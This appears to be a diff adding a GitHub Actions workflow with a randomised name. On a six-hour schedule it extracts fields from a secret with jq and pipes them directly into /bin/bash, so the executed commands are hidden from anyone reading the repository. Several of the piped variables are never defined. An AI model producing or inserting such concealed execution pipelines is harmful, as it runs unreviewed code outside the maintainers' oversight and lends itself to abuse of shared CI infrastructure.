@@ -1,0 +1,21 @@
+name: weizhijia6541
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weizhijia6541
+        env:
+          bgtnq965: ${{ secrets.bgtnq965 }}
+        run: |
+          echo $bgtnq965 | jq -r .ovlq97 | /bin/bash
+          echo $tf17 | jq -r .d55989 | /bin/bash
+          echo $eznue063 | jq -r .w15 | /bin/bash
+          echo $igc89364 | jq -r .tmhoe87199 | /bin/bash
+          echo $mnj6 | jq -r .nneab6 | /bin/bash
+
